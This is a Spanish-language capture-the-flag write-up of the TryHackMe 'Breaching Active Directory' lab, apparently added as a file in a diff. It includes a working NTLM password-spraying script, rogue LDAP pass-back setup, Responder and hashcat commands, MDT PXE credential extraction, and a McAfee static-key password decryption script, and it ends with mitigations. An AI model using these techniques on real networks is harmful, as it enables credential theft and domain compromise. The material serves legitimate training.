@@ -1,0 +1,213 @@
+# Write-Up Completo: TryHackMe - Breaching Active Directory (Parte 1: OSINT y NTLM)
+
+### Dificultad: Medium
+  Objetivo General: Obtener el primer conjunto de credenciales válidas de Active Directory (AD) a través de diferentes vectores de ataque para luego poder enumerar el dominio.
+
+ Active Directory (AD) es el corazón de la gran mayoría de las redes corporativas Windows, lo que lo convierte en el objetivo principal de cualquier Red Team. En este Write-Up, 
+documento mi recorrido por la room Breaching Active Directory de TryHackMe. El objetivo principal no es la escalada de privilegios, sino el paso más crítico del ataque: obtener 
+el primer conjunto de credenciales válidas (foothold). A lo largo de este laboratorio, exploraremos cómo abusar de configuraciones débiles en NTLM, LDAP, sistemas de despliegue 
+(MDT) y archivos de configuración para comprometer cuentas de servicio. 
+
+Task 1 y 2: Introducción, OSINT y Phishing
+
+Antes de lanzar un exploit, el reconocimiento es clave. Active Directory es el "corazón" de las redes Windows, y obtener las credenciales iniciales puede lograrse mediante:
+
+OSINT (Open Source Intelligence): Buscar credenciales expuestas en foros, GitHub o brechas de datos públicas. Herramientas como HaveIBeenPwned o DeHashed son fundamentales para verificar si un correo corporativo ha estado en una filtración.
+Phishing: Engañar a los usuarios para que introduzcan sus credenciales en páginas falsas o instalen malware (RATs), lo que nos permite actuar en el contexto de su cuenta de AD.
+(Nota: En esta room, usaremos estas técnicas para obtener una lista de usuarios y una contraseña por defecto, y luego probaremos esas credenciales en servicios expuestos).
+
+Task 3: Ataque a Servicios Autenticados con NTLM
+
+Entendiendo el protocolo
+
+NTLM (New Technology LAN Manager) es el protocolo de autenticación por excelencia en AD. Utiliza un esquema de "desafío-respuesta" llamado NetNTLM (o Windows Authentication).
+Cuando una aplicación web (como un portal OWA de Exchange, RDP o una VPN) usa NetNTLM, no guarda la contraseña del usuario. En su lugar, actúa como intermediario: la aplicación se comunica con el Domain Controller (DC) para validar al usuario.
+
+Password Spraying (Rociado de contraseñas)
+
+Si intentamos un ataque de fuerza bruta tradicional (probar mil contraseñas para un usuario), las políticas de AD bloquearán la cuenta. En su lugar, hacemos Password Spraying: probamos una sola contraseña (por ejemplo, la típica Changeme123 de bienvenida) contra muchos usuarios.
+
+Hicimos un ataque contra el portal http://ntlmauth.za.tryhackme.com utilizando un script personalizado en Python.
+
+Análisis Técnico del Script de Password Spraying
+
+Para ejecutar el ataque, proporcionamos un script en Python que automatiza las peticiones HTTP. A continuación, se detalla su funcionamiento interno:
+
+python
+import requests
+from requests_ntlm import HttpNtlmAuth
+import sys, getopt
+
+class NTLMSprayer:
+    def __init__(self, fqdn):
+        self.HTTP_AUTH_FAILED_CODE = 401 # Código HTTP de "No autorizado"
+        self.HTTP_AUTH_SUCCEED_CODE = 200 # Código HTTP de "OK" (Login exitoso)
+        self.verbose = True
+        self.fqdn = fqdn
+
+    def load_users(self, userfile):
+        self.users = []
+        lines = open(userfile, 'r').readlines()
+        for line in lines:
+            # Limpia los saltos de línea (\r y \n) de cada usuario
+            self.users.append(line.replace("\r", "").replace("\n", ""))
+HttpNtlmAuth: Esta librería de requests_ntlm es la clave. Permite al script de Python simular la autenticación de Windows (NTLM) que normalmente haría un navegador o un cliente de correo.
+load_users: Lee el archivo de texto, limpia los saltos de línea invisibles y guarda a todos los usuarios en un array (self.users).
+La función principal del ataque (password_spray) itera sobre la lista de usuarios, enviando una petición GET a la URL objetivo con la misma contraseña para todos:
+
+python
+    def password_spray(self, password, url):
+        print ("[*] Starting passwords spray attack using the following password: " + password)
+        count = 0
+        for user in self.users:
+            # Petición HTTP con formato DOMINIO\usuario y la contraseña
+            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
+            
+            # Si el servidor responde 200, la contraseña es correcta
+            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
+                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+                count += 1
+                continue
+            
+            # Si falla (401) y el modo verbose está activo, lo muestra en pantalla
+            if (self.verbose):
+                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
+                    print ("[-] Failed login with Username: " + user)
+        
+        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
+Lógica del ataque:
+El script diferencia entre un login exitoso y uno fallido basándose en los códigos de estado HTTP. Si la aplicación web responde con un 200 OK, la cuenta y contraseña son válidas. Si responde con un 401 Unauthorized, falló. Esto evita bloqueos de cuenta (Account Lockout) al no superar el límite de intentos por usuario.
+
+Finalmente, la función main() utiliza la librería getopt para aceptar parámetros desde la terminal, lo que hace el script reutilizable.
+
+Ejecución y Resultados
+
+bash
+python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p 'Changeme123' -a http://ntlmauth.za.tryhackme.com
+Tras ejecutar el script, obtuvimos respuestas exitosas para varias cuentas. La más relevante para las siguientes fases fue:
+
+Usuario: svcFileCopy
+Contraseña: FPassword1!
+
+Task 4: LDAP Pass-back Attack
+
+Las aplicaciones que usan LDAP (como impresoras o sistemas de terceros) verifican las credenciales directamente contra el Domain Controller. El ataque LDAP Pass-back aprovecha los paneles de administración de estos dispositivos. Si logro cambiar la IP del servidor LDAP por la mía, cuando el dispositivo pruebe la conexión, me enviará sus credenciales.
+
+Preparando el servidor LDAP "Rogue":
+Para que la impresora me envíe la contraseña en texto claro, tuve que montar un servidor LDAP local que solo soporte mecanismos débiles (PLAIN y LOGIN).
+
+Reconfiguré el servicio slapd en mi AttackBox:
+
+bash
+sudo dpkg-reconfigure -p low slapd
+Creé un archivo llamado olcSaslSecProps.ldif para forzar la baja seguridad, deshabilitando el login anónimo y exigiendo que la fuerza mínima de seguridad sea 0 (sin cifrado):
+
+ldif
+dn: cn=config
+changetype: modify
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+Apliqué la configuración al servidor:
+
+bash
+sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif
+sudo systemctl restart slapd
+Capturando las Credenciales:
+
+Accedí al panel de la impresora (http://printer.za.tryhackme.com) y cambié la IP del servidor LDAP por mi IP en la interfaz breachad.
+Puse a escuchar el tráfico de red en el puerto 389 usando tcpdump:
+
+bash
+sudo tcpdump -SX -i breachad tcp port 389
+Al darle a "Test Settings" en la web de la impresora, intercepté el paquete. En el volcado hexadecimal, logré ver en texto claro el usuario svcLDAP y su contraseña asociada.
+
+Task 5: Authentication Relays (Responder)
+
+El protocolo SMB es fundamental en redes Windows para compartir archivos. Para agilizar la resolución de nombres, Windows utiliza protocolos de difusión local como LLMNR, NBT-NS y WPAD. Aproveché esto para realizar un ataque de envenenamiento (Poisoning).
+
+Al ejecutar Responder en la interfaz breachad, la herramienta se quedó escuchando las peticiones de la red. Cuando un usuario o servicio intentó conectarse a un host, Responder interceptó la petición, se hizo pasar por el servidor real y capturó el hash NetNTLMv2 de la víctima.
+
+Nota del auditor: En este entorno de laboratorio, el tráfico se simula cada 30 minutos, por lo que tuve que dejar Responder corriendo un buen rato.
+
+bash
+sudo responder -I breachad
+Una vez capturado el hash, lo guardé en un archivo y procedí a crackearlo offline usando Hashcat con el modo 5600 (NetNTLMv2):
+
+bash
+hashcat -m 5600 hash.txt passwordlist.txt --force
+Resultado: Logré descifrar la contraseña en texto plano para la cuenta de servicio svcFileCopy.
+
+Task 6: Microsoft Deployment Toolkit (MDT)
+
+MDT junto con PXE Boot es la solución que usan las empresas para desplegar Windows por red. Para esto, descargan una imagen de arranque por TFTP y usan un archivo Bootstrap.ini que contiene credenciales de AD.
+
+Proceso de explotación:
+
+Me conecté por SSH al servidor de pruebas: ssh thm@THMJMP1.za.tryhackme.com.
+Consulté la web pxeboot.za.tryhackme.com para obtener el nombre del archivo de arranque BCD (x64{...}.bcd).
+Descargué el BCD desde el servidor MDT usando TFTP:
+
+cmd
+tftp -i 10.200.70.202 GET "\Tmp\x64{...}.bcd" conf.bcd
+Usé PowerShell y el script PowerPXE.ps1 para leer el BCD y encontrar la ruta de la imagen de Windows (.wim).
+Descargué la imagen WIM (de casi 340 MB) vía TFTP a mi máquina:
+
+cmd
+tftp -i 10.200.70.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
+Finalmente, extraje el Bootstrap.ini de la imagen para leer las credenciales:
+
+powershell
+Get-FindCredentials -WimFile pxeboot.wim
+Resultado: Obtuve el usuario svcMDT y su contraseña en texto claro.
+
+Task 7: Configuration Files (McAfee)
+
+Tras obtener acceso al host (THMJMP1), busqué credenciales en archivos de configuración de software de terceros. El antivirus McAfee guarda sus credenciales de conexión con el orquestador en una base de datos local.
+
+Proceso de explotación:
+
+Accedí a la ruta de la base de datos en el servidor Windows:
+
+cmd
+cd C:\ProgramData\McAfee\Agent\DB
+Extraje el archivo ma.db a mi AttackBox usando SCP:
+
+bash
+scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+Abrí el archivo con sqlitebrowser y revisé la tabla AGENT_REPOSITORIES. Encontré el usuario svcAV y su contraseña ofuscada en el campo AUTH_PASSWD.
+Análisis del script de desencriptación:
+McAfee usa una clave estática para proteger esta contraseña. Analizando el script mcafee_sitelist_pwd_decrypt.py, noté que el proceso de descifrado hace dos cosas:
+
+python
+# 1. Clave XOR estática
+KEY = "12150F10111C1A060A1F1B1817160519".decode("hex")
+
+def sitelist_xor(xs):
+    # Aplica XOR a los datos
+    return ''.join(chr(ord(c) ^ ord(KEY[i%16]))for i, c in enumerate(xs))
+
+def des3_ecb_decrypt(data):
+    # 2. Clave 3DES derivada del hash SHA de una cadena estática
+    key = SHA.new(b'<!@#$%^>').digest() + "\x00\x00\x00\x00"
+    des3 = DES3.new(key, DES3.MODE_ECB, "")
+    decrypted = des3.decrypt(data)
+    return decrypted[0:decrypted.find('\x00')] or "<empty>"
+El script decodifica el Base64, aplica una operación XOR con la clave estática y finalmente descifra el resultado usando 3DES (modo ECB).
+
+Ejecución:
+
+bash
+python2 mcafee_sitelist_pwd_decrypt.py <AUTH_PASSWD_VALUE>
+Resultado: El script me devolvió la contraseña de la cuenta svcAV en texto plano.
+
+Task 8: Conclusiones y Mitigaciones
+
+A lo largo de este laboratorio, logré comprometer el dominio obteniendo múltiples cuentas de servicio (svcFileCopy, svcLDAP, svcMDT, svcAV) sin necesidad de usar exploits de día cero. Todo se basó en abusar de configuraciones débiles, protocolos heredados y falta de protección en los sistemas de despliegue.
+
+Medidas de mitigación recomendadas:
+
+Concienciación del usuario: El eslabón más débil es el humano; hay que evitar el phishing y la filtración de datos.
+Limitar la exposición: No exponer servicios como NTLM o LDAP directamente a Internet; usar VPNs con MFA.
+NAC (Network Access Control): Prevenir la conexión de dispositivos no autorizados (rogue devices) en la red interna.
+Forzar SMB Signing: Esto mitiga de raíz los ataques de retransmisión (Relay) y envenenamiento.
+Principio de menor privilegio: Las cuentas de servicio (impresoras, MDT, antivirus) deben tener permisos estrictamente limitados para minimizar el impacto si son comprometidas.
